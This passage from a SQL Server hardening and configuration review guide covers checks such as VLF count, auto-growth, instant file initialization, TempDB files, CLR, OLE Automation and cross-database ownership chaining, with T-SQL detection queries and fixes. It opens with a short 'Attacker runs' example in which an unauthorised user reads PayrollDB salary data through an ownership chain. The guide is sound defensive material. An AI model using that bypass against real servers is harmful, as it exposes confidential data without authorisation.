    SELECT * FROM SalesDB.dbo.Orders;
    SELECT * FROM PayrollDB.dbo.Salaries;  -- cross-DB reference, same owner
GO
GRANT EXECUTE ON usp_GetAllOrders TO AttackerUser;

-- Attacker runs:
USE SalesDB;
EXEC usp_GetAllOrders;
-- Returns Salaries data from PayrollDB — no permission check was done on PayrollDB
-- AttackerUser has never been granted any access to PayrollDB
```

**Escalation with instance-level chaining (`sp_configure 'cross db ownership chaining', 1`)**

When chaining is enabled at the instance level, **all** databases participate — including `master`, `msdb`, and `model`. MS Learn warns:

> "A local database user with elevated privileges can exploit ownership chaining to escalate permissions and potentially gain **sysadmin** access."

```sql
-- With instance-level chaining ON, a db_owner in any database
-- can chain through to msdb (TRUSTWORTHY ON by default) or master
-- and execute administrative procedures if ownership chains align

-- Audit: find proc definitions that reference cross-DB objects
SELECT DB_NAME()        AS calling_db,
       o.name           AS proc_name,
       m.definition
FROM sys.sql_modules m
JOIN sys.objects o ON m.object_id = o.object_id
WHERE m.definition LIKE '%[A-Za-z0-9_]%.[A-Za-z0-9_]%.[A-Za-z0-9_]%.[A-Za-z0-9_]%'  -- 4-part names
   OR m.definition LIKE '%.dbo.%'                                                       -- cross-DB refs
ORDER BY o.name;
```

**Important limitation of chaining (by design)**
Cross-database chaining only works for **static SQL**. As soon as dynamic SQL (`EXEC (@sql)`) is introduced inside a chain, SQL Server breaks the chain and falls back to permission-checking the caller. This is a documented MS Learn behaviour: "Cross-database ownership chaining does not work in cases where dynamically created SQL statements are executed."

**Fix options**
1. `ALTER DATABASE [x] SET DB_CHAINING OFF` on all user databases (safe default)
2. `EXEC sp_configure 'cross db ownership chaining', 0; RECONFIGURE;` — disables instance-wide (B27)
3. Replace cross-database views and procs with explicit GRANTs: `GRANT SELECT ON [PayrollDB].[dbo].[Salaries] TO [SalesDB_AppUser]` — permission is visible, auditable, and intentional
4. Use certificate-based signing to grant cross-database access through a signed proc — no ownership chain required and the permission is explicit

**Related checks:** B27 (instance-level cross-DB chaining — broader scope of the same risk), B17 (TRUSTWORTHY — the other database permission-boundary bypass)

---

## B19–B23 — File and Storage Configuration

### B19 — Excessive VLF Count

**What it means**
The transaction log is divided into Virtual Log Files (VLFs). SQL Server manages VLF creation internally: small, frequent auto-grow events create many tiny VLFs; one large initial allocation creates fewer, larger VLFs. Thousands of VLFs slow database startup (SQL Server scans all VLFs during recovery), log backup, and replication log reader. SQL Server itself logs error 9017 when a database starts with an excessive VLF count, and MS Learn's own `sys.dm_db_log_info` example query flags **> 100** VLFs as worth investigating. The **> 1000 / > 5000** cutoffs this check uses are **operational severity heuristics, not MS-documented thresholds** — treat > 100 as the documented review point and the higher numbers as escalating concern.

**How to spot it**
```sql
-- SQL Server 2016 SP2+ (preferred):
SELECT DB_NAME(s.database_id) AS db_name, COUNT(*) AS vlf_count
FROM sys.databases AS s
CROSS APPLY sys.dm_db_log_info(s.database_id) AS l
GROUP BY s.database_id
ORDER BY vlf_count DESC;

-- Or using sys.dm_db_log_stats (also 2016 SP2+):
SELECT name, total_vlf_count
FROM sys.databases AS s
CROSS APPLY sys.dm_db_log_stats(s.database_id)
ORDER BY total_vlf_count DESC;

-- Legacy (pre-2016 SP2):
DBCC LOGINFO;  -- count rows per database
```

**Example (problem → fix)**
```sql
-- Problem: OrdersDB has 12,000 VLFs from years of 10 MB auto-grows on a 50 GB log
-- Log backups take 8 minutes; database restart takes 4 minutes

-- Fix (run during maintenance window):
-- Step 1: take a log backup to clear inactive VLFs
BACKUP LOG [OrdersDB] TO DISK = 'NUL';

-- Step 2: shrink the log file to minimum
USE [OrdersDB];
DBCC SHRINKFILE (OrdersDB_log, 1);

-- Step 3: expand to full size in one operation (creates ~16 VLFs)
ALTER DATABASE [OrdersDB] MODIFY FILE (
    NAME = OrdersDB_log,
    SIZE = 51200MB,       -- 50 GB
    FILEGROWTH = 512MB    -- fixed increment going forward
);
```

**Fix options**
1. Shrink + single large regrow: fastest VLF reduction
2. Change FILEGROWTH to a fixed MB value (512 MB is common) to prevent future fragmentation
3. Pre-size the log at database creation based on peak log generation rate

**Related checks:** B20 (percent log growth — root cause of VLF fragmentation), Z7–Z9 in `sqldiskio-review`

---

### B20 — Log File Using Percent Auto-Growth

**What it means**
When a log file is configured to grow by a percentage, each growth event is calculated as a percentage of the current file size. A 10% growth on a 1 GB log = 100 MB; the same 10% on a 50 GB log = 5 GB — blocking sessions for seconds to minutes while the space is initialised (log files cannot use IFI). Percent growth also creates increasingly large VLFs with each growth event.

**How to spot it**
```sql
SELECT DB_NAME(database_id) AS db_name, name, type_desc,
       growth, is_percent_growth,
       CASE is_percent_growth WHEN 1 THEN CAST(growth AS varchar) + '%'
       ELSE CAST(growth * 8 / 1024 AS varchar) + ' MB' END AS growth_setting
FROM sys.master_files
WHERE type = 1              -- LOG files only
  AND is_percent_growth = 1
  AND growth > 0;
```

**Example (problem → fix)**
```sql
-- Problem: TransactionDB log grows by 10% from 20 GB = 2 GB events
-- Each growth event blocks transactions for ~90 seconds

ALTER DATABASE [TransactionDB] MODIFY FILE (
    NAME = TransactionDB_log,
    FILEGROWTH = 512MB      -- fixed 512 MB increments
);
```

**Fix options**
1. Set FILEGROWTH to a fixed MB value: 256–1024 MB depending on transaction volume
2. Also pre-size the log to avoid growth events during peak hours
3. Monitor `sys.dm_io_virtual_file_stats` io_stall_write_ms for log file stall reduction

**Related checks:** B19 (VLF count — percent growth is the root cause), B22 (IFI — log growths ≤64 MB can use IFI on SQL 2022+, larger ones still zero)

---

### B21 — Data File Using Percent Auto-Growth

**What it means**
Same root problem as B20 but for data files. Unlike log files, data files can use IFI (B22) — so the zeroing overhead is avoided — but the growth event itself still requires updating allocation structures and blocks the connection that triggered the growth. Percent growth on large data files produces enormous, unpredictable growth events.

**How to spot it**
```sql
SELECT DB_NAME(database_id) AS db_name, name, type_desc,
       growth, is_percent_growth,
       CASE is_percent_growth WHEN 1 THEN CAST(growth AS varchar) + '%'
       ELSE CAST(growth * 8 / 1024 AS varchar) + ' MB' END AS growth_setting
FROM sys.master_files
WHERE type = 0              -- ROWS (data) files only
  AND is_percent_growth = 1
  AND growth > 0;
```

**Example (problem → fix)**
```sql
-- Problem: SalesDB data file is 500 GB; 10% growth = 50 GB event
-- A quarterly load triggers growth at 2 AM, blocking for 3 minutes

ALTER DATABASE [SalesDB] MODIFY FILE (
    NAME = SalesDB_Data,
    FILEGROWTH = 1024MB     -- 1 GB fixed increments
);
-- Also pre-size before the quarterly load:
ALTER DATABASE [SalesDB] MODIFY FILE (
    NAME = SalesDB_Data,
    SIZE = 614400MB         -- 600 GB pre-allocated
);
```

**Fix options**
1. Switch to fixed MB FILEGROWTH: 512 MB – 2 GB depending on database size and growth rate
2. Pre-size data files based on capacity planning to minimise auto-grow events
3. Enable IFI (B22) to eliminate the zeroing overhead for data file growth events

**Related checks:** B22 (IFI — reduces data growth event blocking), B10 (auto-shrink — undoes manual pre-sizing)

---

### B22 — Instant File Initialization Not Enabled

**What it means**
When SQL Server creates or expands a data file, it must initialise the new space. Without IFI, this means writing zeros to every byte of the new space — a process that can take seconds for small files and minutes for large ones, during which the triggering session (or recovery) is blocked. With IFI enabled, SQL Server skips the zeroing and marks the space as unallocated, which is instant. IFI applies to data files at any version. For **transaction log** files it historically did not apply (always zeroed), but starting with SQL Server 2022 (16.x), all editions — plus Azure SQL Database/MI — log autogrowth events **up to 64 MB** also benefit from IFI (larger log growths still zero, and the 64 MB log benefit does not need `SE_MANAGE_VOLUME_NAME`).

**How to spot it**
```sql
-- SQL Server 2012 SP4, 2014 SP3, 2016 SP1+
-- Column is nvarchar(1): 'Y' = IFI enabled, 'N' = IFI disabled
SELECT servicename, instant_file_initialization_enabled
FROM sys.dm_server_services
WHERE servicename LIKE 'SQL Server (%';
-- instant_file_initialization_enabled = 'N' → B22 fires

-- Legacy detection (check ERRORLOG at startup):
-- Look for: "Database Instant File Initialization: disabled"
```

**Example (problem → fix)**
```sql
-- Problem: RESTORE DATABASE of a 200 GB database takes 18 minutes
-- Most of that time is zeroing the new data files

-- Fix: grant SE_MANAGE_VOLUME_NAME to SQL Server service account
-- 1. Open Local Security Policy → Local Policies → User Rights Assignment
-- 2. "Perform volume maintenance tasks" → Add the SQL Server service account
-- 3. Restart the SQL Server service

-- Verify after restart (column is nvarchar(1)):
SELECT instant_file_initialization_enabled
FROM sys.dm_server_services
WHERE servicename LIKE 'SQL Server (%';
-- Should return 'Y'
```

**Fix options**
1. Grant `SE_MANAGE_VOLUME_NAME` via Group Policy or Local Security Policy, then restart SQL Server
2. On Azure VMs, IFI is typically pre-enabled on SQL Server images — verify via DMV
3. IFI has a minor security implication: previously deleted data may be readable before it is overwritten — documented and acceptable in most enterprise environments

**Related checks:** B21 (percent data auto-growth — IFI eliminates the zeroing stall from growth events)

---

### B23 — TempDB File Count Below Recommended

**What it means**
TempDB is a shared resource used by all sessions for sorts, spills, row versioning (RCSI/snapshot), and temporary tables. The TempDB allocation page (PFS, GAM, SGAM) bottleneck occurs when many sessions compete for space on the same allocation page. Microsoft's guidance is to have one TempDB data file per logical scheduler (CPU), up to a maximum of 8. Too few files cause severe `PAGELATCH_EX` waits on the TempDB allocation pages.

**How to spot it**
```sql
-- Count TempDB data files
SELECT COUNT(*) AS tempdb_file_count
FROM sys.master_files
WHERE database_id = 2 AND type = 0;  -- type 0 = ROWS (data files)

-- Compare to scheduler count (target: MIN(scheduler_count, 8))
SELECT scheduler_count FROM sys.dm_os_sys_info;
-- If tempdb_file_count < MIN(scheduler_count, 8) → B23 fires
```

**Example (problem → fix)**
```sql
-- Problem: 16-scheduler server has 2 TempDB data files
-- sys.dm_os_waiting_tasks shows PAGELATCH_EX waits on TempDB pages 1:1 and 1:3

-- Fix: add 6 more TempDB data files (all same size as existing)
ALTER DATABASE [tempdb] ADD FILE (
    NAME = tempdev3,
    FILENAME = 'D:\TempDB\tempdev3.ndf',
    SIZE = 4096MB,
    FILEGROWTH = 512MB
);
-- Repeat for tempdev4 through tempdev8
-- All files must be the same size for proportional fill to distribute evenly
```

**Fix options**
1. Add files to reach MIN(scheduler_count, 8) — no restart required
2. Ensure all TempDB files are the same size and have the same FILEGROWTH setting
3. Place TempDB files on fast, dedicated storage (NVMe preferred)
4. On high-core servers (> 8 per NUMA node), consider trace flag 1117 (SQL 2014-) or `AUTOGROW_ALL_FILES` (SQL 2016+)

**Related checks:** B13 (RCSI — version store lives in TempDB), V30–V32 in `sqlwait-review`

---

## B24–B28 — Surface Area and Feature Exposure

### B24 — CLR Enabled

**What it means**
CLR integration allows .NET assemblies to run inside the SQL Server process. This significantly expands the attack surface — a compromised CLR assembly can execute arbitrary .NET code with the SQL Server service account's privileges. Most databases do not use CLR; enabling it unnecessarily violates least-privilege principles.

**How to spot it**
```sql
SELECT name, value AS config_value
FROM sys.configurations
WHERE name = 'clr enabled';

-- Check if CLR objects actually exist
SELECT COUNT(*) AS clr_object_count
FROM sys.assemblies
WHERE is_user_defined = 1;
-- If clr enabled = 1 AND clr_object_count = 0 → disable
```

**Example (problem → fix)**
```sql
-- No CLR assemblies found; disable CLR
EXEC sp_configure 'clr enabled', 0;
RECONFIGURE;
```

**Fix options**
1. Disable if no user-defined assemblies exist
2. If CLR is used: audit assemblies, prefer SAFE permission set, avoid UNSAFE
3. SQL Server 2017+ introduced CLR strict security — enable it if CLR must remain on

**Related checks:** B17 (Trustworthy — required for EXTERNAL_ACCESS CLR assemblies)

---

### B25 — OLE Automation Procedures Enabled

**What it means**
OLE Automation Procedures (`sp_OACreate`, `sp_OAMethod`, `sp_OAGetProperty`, etc.) allow T-SQL to instantiate and call COM objects on the SQL Server host. This is a significant attack surface — an attacker with EXECUTE permission on these procedures can interact with the Windows COM subsystem, create files, launch processes, and potentially escalate privileges.

**How to spot it**
```sql
SELECT name, value AS config_value
FROM sys.configurations
WHERE name = 'Ole Automation Procedures';
-- config_value = 1 → B25 fires
```

**Example (problem → fix)**
```sql
-- OLE Automation was enabled for an old SMTP email solution
-- replaced by Database Mail years ago

EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;
```

**Fix options**
1. Disable immediately if no code references `sp_OA*` procedures
2. Search all databases before disabling: `SELECT * FROM sys.sql_modules WHERE definition LIKE '%sp_OA%'`
3. Replace OLE Automation email with Database Mail (`msdb.dbo.sp_send_dbmail`)

**Related checks:** B26 (Ad Hoc Distributed Queries — another attack surface vector)

---

### B26 — Ad Hoc Distributed Queries Enabled

**What it means**
Ad Hoc Distributed Queries allows `OPENROWSET` and `OPENDATASOURCE` to connect to arbitrary data sources (Excel files, Access databases, remote SQL Servers, etc.) without a pre-configured linked server. Anyone with appropriate permissions can read files from the server's filesystem or connect to remote systems, potentially leaking data or enabling SSRF-style attacks.

**How to spot it**
```sql
SELECT name, value AS config_value
FROM sys.configurations
WHERE name = 'Ad Hoc Distributed Queries';
-- config_value = 1 → B26 fires
```

**Example (problem → fix)**
```sql
-- Ad Hoc Distributed Queries was enabled for a one-time Excel import years ago
-- No current usage found in procedure definitions

EXEC sp_configure 'Ad Hoc Distributed Queries', 0;
RECONFIGURE;
```

**Fix options**
1. Disable if no current usage — search first: `SELECT * FROM sys.sql_modules WHERE definition LIKE '%OPENROWSET%' OR definition LIKE '%OPENDATASOURCE%'`
2. Replace ad hoc queries with pre-configured linked servers that limit connection scope
3. Use BULK INSERT with explicit file paths rather than OPENROWSET for file imports

**Related checks:** B25 (OLE Automation), B27 (cross-DB chaining)

---

### B27 — Instance-Level Cross-Database Ownership Chaining Enabled

**What it means**
When instance-level cross-database ownership chaining is enabled, ownership chain traversal is allowed between all databases on the server — including system databases. This is a broader permission bypass than per-database chaining (B18) and is almost never correct in production. A user in database A can access objects in database B (including system objects) without explicit permission if ownership chains align.

**How to spot it**
```sql
SELECT name, value AS config_value
FROM sys.configurations
WHERE name = 'cross db ownership chaining';
-- config_value = 1 → B27 fires
```

**Example (problem → fix)**
```sql
-- Instance-level chaining enabled for a legacy 3-part-name report
-- that was replaced 4 years ago

EXEC sp_configure 'cross db ownership chaining', 0;
RECONFIGURE;
-- Then enable per-database where genuinely needed (B18)
```

**Fix options**
1. Disable instance-level chaining immediately
2. Enable per-database chaining on specific database pairs that require it (B18)
3. Audit all cross-database views and procedures before disabling to identify dependencies

**Related checks:** B18 (per-database chaining), B17 (Trustworthy)

---

### B28 — Remote Admin Connection Disabled

**What it means**
The Dedicated Administrator Connection (DAC) allows a single administrative connection to SQL Server even when the server is under severe load or deadlocked and normal connections are refused. Without remote DAC enabled, the DAC is only accessible from a session on the server console — impractical for production servers managed remotely, clustered instances, or containers.

**How to spot it**
```sql
SELECT name, value AS config_value
FROM sys.configurations
WHERE name = 'remote admin connections';
-- config_value = 0 → B28 fires as Info
```

**Example (problem → fix)**
```sql
-- DAC is only accessible locally; server is remote-only
-- During a crisis, an admin cannot connect via DAC from their workstation

EXEC sp_configure 'remote admin connections', 1;
RECONFIGURE;

-- Connect via DAC remotely:
-- sqlcmd -S admin:SERVERNAME -U sa -P password
```

**Fix options**
1. Enable on servers managed remotely, clustered, or in containers
2. Limit DAC access via firewall rules (TCP port 1434 on named instances, or TCP 1434/admin on default)
3. Document DAC credentials and access procedure in the emergency runbook

**Related checks:** (none — standalone administrative feature)

---

## Quick Reference Table

| Check | Category | Trigger | Severity |
|-------|----------|---------|----------|
| B1 | Parallelism | MAXDOP = 0 on multi-NUMA | Warning |
| B2 | Parallelism | CTP = 5 (default) | Warning |
| B3 | Parallelism | MAXDOP > schedulers/NUMA | Warning |
| B4 | Parallelism | Optimize for Ad Hoc = 0 | Warning |
| B5 | Parallelism | Query Governor = 0 | Info |
| B6 | Memory | Max Server Memory config_value = 0 | Critical |
| B7 | Memory | Min Server Memory > 0 | Warning |
| B8 | Memory | sql_memory_model_desc = LOCK_PAGES | Info |
| B9 | Memory | AWE enabled on 64-bit | Warning |
| B10 | DB Settings | is_auto_shrink_on = 1 | Critical |
| B11 | DB Settings | is_auto_close_on = 1 | Critical |
| B12 | DB Settings | compatibility_level < SQL version × 10 | Warning |
| B13 | DB Settings | is_read_committed_snapshot_on = 0 | Warning |
| B14 | DB Settings | page_verify_option_desc ≠ CHECKSUM | Warning |
| B15 | DB Settings | is_auto_create_stats_on = 0 | Warning |
| B16 | DB Settings | is_auto_update_stats_on = 0 | Warning |
| B17 | DB Settings | is_trustworthy_on = 1 (non-msdb) | Warning |
| B18 | DB Settings | is_db_chaining_on = 1 | Warning |
| B19 | File/Storage | VLF count > 1000 / > 5000 | Warning / Critical |
| B20 | File/Storage | Log is_percent_growth = 1 | Warning |
| B21 | File/Storage | Data is_percent_growth = 1 | Warning |
| B22 | File/Storage | IFI not enabled | Warning |
| B23 | File/Storage | TempDB files < MIN(schedulers, 8) | Warning |
| B24 | Surface Area | CLR enabled | Info |
| B25 | Surface Area | OLE Automation Procedures = 1 | Warning |
| B26 | Surface Area | Ad Hoc Distributed Queries = 1 | Warning |
| B27 | Surface Area | cross db ownership chaining = 1 (instance) | Warning |
| B28 | Surface Area | remote admin connections = 0 | Info |
